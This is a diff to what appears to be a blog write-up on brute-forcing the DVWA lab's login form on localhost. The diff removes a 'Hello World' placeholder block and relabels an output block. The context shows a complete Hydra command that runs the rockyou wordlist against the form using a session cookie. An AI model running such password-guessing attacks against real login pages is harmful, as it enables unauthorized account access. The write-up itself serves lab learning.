@@ -51,37 +51,11 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vul
 
 Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page
 
-
-
-
-
-
-{::options parse_block_html="true" /}
-
-<details><summary markdown="span">Let's see some code!</summary>
-  
-```python
-print('Hello World!')
-```
-  
-Of course, it has to be Hello World, right?
-  
-</details>
-<br/>
-
-{::options parse_block_html="false" /}
-
-
-
-
-
-
-
 {::options parse_block_html="true" /}
 
 <details><summary markdown="span">Click to see output </summary>
   
-```python
+```Shell
   
 ┌─[aftab@parrot]─[~/Downloads/dvwa]
 └──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
@@ -98,7 +72,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-17 23:51:
 ```
   
 </details>
-
 
 {::options parse_block_html="false" /}
 
